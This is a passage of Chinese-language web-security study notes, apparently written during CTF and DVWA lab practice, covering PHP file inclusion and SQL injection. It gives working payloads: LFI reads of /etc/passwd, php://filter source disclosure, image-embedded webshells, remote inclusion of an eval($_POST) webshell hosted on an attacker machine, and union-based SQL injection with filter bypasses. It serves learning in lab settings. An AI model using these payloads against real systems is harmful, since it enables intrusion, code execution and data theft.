href="https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/gr98bRUp63TUwcHiaLZzEf.html">https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/gr98bRUp63TUwcHiaLZzEf.html</a></p><h1 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2. 文件包含漏洞"></a>2. 文件包含漏洞</h1><p>文件包含类似于C语言的include头文件，python的import文件，也类似于函数调用。</p><h2 id="2-1-本地文件包含-LFI"><a href="#2-1-本地文件包含-LFI" class="headerlink" title="2.1 本地文件包含(LFI)"></a>2.1 本地文件包含(LFI)</h2><p>URL格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7ce7fcde-b026-4e63-a0f1-11442ec86169.node4.buuoj.cn:81/?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=include.php</span><br><span class="line"></span><br><span class="line">#include.php和a.jpg与index.php在同一目录</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=a.jpg</span><br><span class="line"></span><br><span class="line">#/ect/passwd与index.php路径不同，也可以执行</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=/etc/passwd</span><br></pre></td></tr></table></figure><p>URL中带参数，定位到服务器的某个目录某个文件中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WAF的问题：WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));列出参数目录中的文件和目录，这里由于单引号和斜杠被过滤了，那就用<span class="title function_ invoke__">chr</span>()绕过，<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)就是斜杠/</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)));</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flagg&#x27;</span>));读取flagg文件</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="string">&#x27;flagg&#x27;</span>));如果只绕过/，后面的引号又被过滤掉了，所以将所有字符都换成<span class="title function_ invoke__">chr</span>()</span><br><span class="line">这里/=<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)，f=<span class="title function_ invoke__">chr</span>(<span class="number">102</span>),l=<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),a=<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),g=<span class="title function_ invoke__">chr</span>(<span class="number">103</span>),g=<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)来进行绕过</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)));.表示连接</span><br></pre></td></tr></table></figure><p>有时候下载下来的txt文件貌似找不到flag，但将txt文件放在URL中就可找到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">读敏感文件</span><br><span class="line">?file=/etc/passwd</span><br><span class="line"></span><br><span class="line">利用封装协议读源代码,能看到php文件源码</span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line">包含图片Getshell</span><br><span class="line">在上传的图片中写入恶意代码，然后用本地文件包含调用，就会执行图片里的php代码</span><br><span class="line"></span><br><span class="line">包含日志文件Getshell</span><br><span class="line">路径</span><br><span class="line">apache:/<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">nginx:/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">session文件包含Getshell</span><br><span class="line">?file=/<span class="keyword">var</span>/log/nignx/access.log</span><br><span class="line"></span><br><span class="line">照片木马制作</span><br><span class="line">copy <span class="number">1</span>.jpg/b + <span class="number">1</span>.php/a <span class="number">2</span>.jpg</span><br></pre></td></tr></table></figure><h2 id="2-2-远程文件包含-RFI"><a href="#2-2-远程文件包含-RFI" class="headerlink" title="2.2 远程文件包含(RFI)"></a>2.2 远程文件包含(RFI)</h2><p>URL格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=http://web_server/b.jpg</span><br></pre></td></tr></table></figure><p>PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞”，远程文件包含更容易实现。</p><p><code>allow_url_fopen = On</code> 是否允许打开远程文件； <code>allow_url_include = On</code> 是否允许include/require远程文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-d46d08980443a4ef.sandbox.ctfhub.com:10080/?file=http://你的服务器地址:8000/shell1.php</span><br></pre></td></tr></table></figure><h2 id="2-3-利用php-filter伪协议"><a href="#2-3-利用php-filter伪协议" class="headerlink" title="2.3 利用php://filter伪协议"></a>2.3 利用php://filter伪协议</h2><p>如果想要读取本地的PHP文件，可以用php://filter伪协议。</p><p>当与包含函数结合时，php://filter流会被当作php文件执行。这时，如果我们不想让它执行，只是想查看源码，可以对其进行编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2be338a6-7ba2-453a-b873-4b4b7a4b4221.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="2-4-文件包含漏洞-低"><a href="#2-4-文件包含漏洞-低" class="headerlink" title="2.4 文件包含漏洞[低]"></a>2.4 文件包含漏洞[低]</h2><p>结合文件上传漏洞[高]，我们用<strong>本地文件包含</strong>。思路是上传图片木马，即图片中包含生成木马的代码，如果系统有文件包含漏洞，就可以执行图片中的代码，生成木马。</p><p>利用php://fileter伪协议进行文件包含。</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>$_GET函数表示参数会显示在地址栏上，默认地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/?page=include.php</span><br></pre></td></tr></table></figure><p>准备一张小一点的图片hello.jpg，一个木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell4.php</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell4.php&quot;</span>,<span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php eval($_POST[caidao]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用cmd生成一个图片木马hi.jpg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy hello.jpg/b + shell4.php/a hi.jpg</span><br></pre></td></tr></table></figure><p>将图片放入winhex拉到最下面就可以看到木马已经放进图片中了。（或者用记事本打开图片也能看到）</p><p>将图片上传后，去到文件包含漏洞页面，执行payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=../../hackable/uploads/hi.jpg</span><br><span class="line"></span><br><span class="line">//dvwa文件上传访问的目录</span><br><span class="line">/var/www/dvwa/hackable/uploads</span><br><span class="line"></span><br><span class="line">//dvwa文件包含访问的目录</span><br><span class="line">/var/www/dvwa/vulnerabilities/fi</span><br></pre></td></tr></table></figure><p>执行完后网页会出现一堆乱码，别管它，关键是会在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，正是我们放进图片中的代码生成的一句话木马。</p><p>写入菜刀地址：<a href="http://192.168.137.146/dvwa/vulnerabilities/fi/shell4.php和密码，成功渗透。">http://192.168.137.146/dvwa/vulnerabilities/fi/shell4.php和密码，成功渗透。</a></p><p><strong>远程文件包含</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a//查看IP地址：192.168.137.144</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将txt文件写进攻击机服务器的站点</span></span><br><span class="line">vim /<span class="keyword">var</span>/www/html/chopper.txt</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell4.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[caidao]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以打开<a href="http://192.168.137.144/chopper.txt试试，如果正常显示我们写进去的内容说明路径没错。">http://192.168.137.144/chopper.txt试试，如果正常显示我们写进去的内容说明路径没错。</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/?page=http://192.168.137.144/chopper.txt</span><br></pre></td></tr></table></figure><p>执行后在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，成功。</p><h2 id="2-2-文件包含漏洞-中"><a href="#2-2-文件包含漏洞-中" class="headerlink" title="2.2 文件包含漏洞[中]"></a>2.2 文件包含漏洞[中]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">// The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bad input validation</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;https://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);        </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>源码的意思是将参数中含有”<a href="http://&quot;，&quot;https://&quot;替换成空，这时只要将限制字符串重写：">http://&quot;，&quot;https://&quot;替换成空，这时只要将限制字符串重写：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.137.144/chopper.txt</span><br><span class="line"></span><br><span class="line">把中间的http://替换成空，前后一合并就可以访问到远程服务器</span><br></pre></td></tr></table></figure><p>第二种方法是用本地文件包含来做，同[低]。</p><h2 id="2-3-文件包含漏洞-高"><a href="#2-3-文件包含漏洞-高" class="headerlink" title="2.3 文件包含漏洞[高]"></a>2.3 文件包含漏洞[高]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only allow include.php</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>基本锁死了。</p><p><strong>小知识</strong></p><p>robots.txt是爬虫的君子协议，说明哪些目录是不能爬的，一般直接在网址后面输入/robots.txt就可看到，但同时也有一点此地无银三百两的意思，说明这些目录很重要。</p><p>Ctrl + L清空终端界面</p><h1 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h1><p>危害：</p><ol><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露</li><li>网页篡改：通过操作数据库对特定网页进行篡改</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改</li><li>服务器被远程控制：被安装后门</li></ol><p>MySQL基础操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show databases;查看数据库</span><br><span class="line">use database_name;使用数据库</span><br><span class="line">show tables;查看表</span><br><span class="line">desc table_name;查看表结构</span><br><span class="line">select * from table_name;查看表数据</span><br><span class="line">create database database_name;创建数据库</span><br><span class="line">drop database database_name;删除数据库</span><br></pre></td></tr></table></figure><p>常用变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database()查看当前数据库名select database();</span><br><span class="line">user()查看当前用户 select user();</span><br><span class="line">version()查看版本   select version();</span><br><span class="line">show variables like&#x27;%datadir%&#x27;;查看安装路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,database()</span><br><span class="line">union select 1,2,group_concat(table_name) from information_sehema.tables where table_schema=database()</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;</span><br><span class="line">union select 1,2,group_concat(column1_name,column2_name) from xxx</span><br></pre></td></tr></table></figure><p><strong>information_schema库</strong></p><p>information_schema是非常重要的库，是数据库字典，包含所有数据库的库信息，表信息。</p><p>查询数据库名为dvwa的所有表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;dvwa&#x27;;</span><br><span class="line">+--------------+------------+</span><br><span class="line">| TABLE_SCHEMA | TABLE_NAME |</span><br><span class="line">+--------------+------------+</span><br><span class="line">| dvwa         | guestbook  |</span><br><span class="line">| dvwa         | users      |</span><br><span class="line">+--------------+------------+</span><br><span class="line">2 rows in set (0.08 sec)</span><br></pre></td></tr></table></figure><p>查询数据库名为dvwa的users表的所有列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select COLUMN_NAME from information_schema.columns where TABLE_SCHEMA=&#x27;dvwa&#x27; and TABLE_NAME=&#x27;users&#x27;;</span><br><span class="line">+-------------+</span><br><span class="line">| COLUMN_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| user_id     |</span><br><span class="line">| first_name  |</span><br><span class="line">| last_name   |</span><br><span class="line">| user        |</span><br><span class="line">| password    |</span><br><span class="line">| avatar      |</span><br><span class="line">+-------------+</span><br><span class="line">6 rows in set (0.03 sec)</span><br></pre></td></tr></table></figure><h2 id="3-1-错误注入"><a href="#3-1-错误注入" class="headerlink" title="3.1 错误注入"></a>3.1 错误注入</h2><h3 id="3-1-1-SQL注入-低"><a href="#3-1-1-SQL注入-低" class="headerlink" title="3.1.1 SQL注入(低)"></a>3.1.1 SQL注入(低)</h3><p>输入’——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; order by 4 -- d</span><br><span class="line">-1&#x27; union select 1,2,3 -- +</span><br><span class="line">-1 union select 1,database()</span><br></pre></td></tr></table></figure><p>有时会将select,from,or,where等关键字过滤，可以将这些关键字进行重写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; ununionion seleselectct 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;geek&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27; ununionion seleselectct 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27; ununionion seleselectct 1,database(),group_concat(id,username,passwoorrd) frfromom b4bsql#</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>过滤关键字</th><th>绕过方法之一</th><th>绕过方法之二</th><th>绕过方法之三</th></tr></thead><tbody><tr><td>select</td><td>重写</td><td>大小写</td><td>selec\x74</td></tr><tr><td>or</td><td>重写</td><td>大小写</td><td>o\x72</td></tr><tr><td>union</td><td>重写</td><td>大小写</td><td>unio\x6e</td></tr><tr><td>空格</td><td>#、—、//、/**/、%00</td><td>%2520</td><td>‘</td></tr></tbody></table></div><p>输入’——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_numrows</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$first</span> = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在源码上可以看到我们输入的东西根据这条语句去查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>意思是将我们输入的ID的名字显示出来，但如果输入<strong>‘ or 1=1 — ddd</strong>，整条语句变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27; or 1=1 -- ddd &#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>输入的单引号与源码的单引号闭合，1=1永远为真，—是注释后面所有。1=1把所有元组显示出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: user</span><br><span class="line">Surname: user</span><br></pre></td></tr></table></figure><p>但这个只局限于这张表的first_name和last_name，再也查不出其它东西来，于是我们可以通过联合查询，查询其他列甚至其他表。</p><p>在不知道源码的情况下，输入单引号页面报错，说明有注入漏洞。我们可以输入union试字段<strong>‘ union select 1 — d</strong>，页面报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure><p>试<strong>‘ union select 1,2 — d</strong>，没报错，说明字段是2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select 1,2 -- d</span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure><p>试<strong>‘ union select user(),database() — d</strong>，获得当前用户和当前数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select user(),database() -- d</span><br><span class="line">First name: dvwa@localhost</span><br><span class="line">Surname: dvwa</span><br></pre></td></tr></table></figure><p>试<strong>‘ union select table_schema,1 from information_schema.tables — dd</strong>，查询所有库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select table_schema,1 from information_schema.tables -- dd</span><br><span class="line">First name: information_schema</span><br><span class="line">Surname: 1</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select table_schema,1 from information_schema.tables -- dd</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: 1</span><br></pre></td></tr></table></figure><p>网页只显示了两个库，因为这个用户的权限只能看到这两个库。</p><p>试<strong>‘ union select table_schema,table_name from information_schema.tables where table_schema=’dvwa’ — dd</strong>，查询dvwa库的所有表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; -- dd</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: guestbook</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; -- dd</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: users</span><br></pre></td></tr></table></figure><p>试<strong>‘ union select 1,column_name from information_schema.columns where table_name=’users’ — dd</strong>，查询users表中的列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 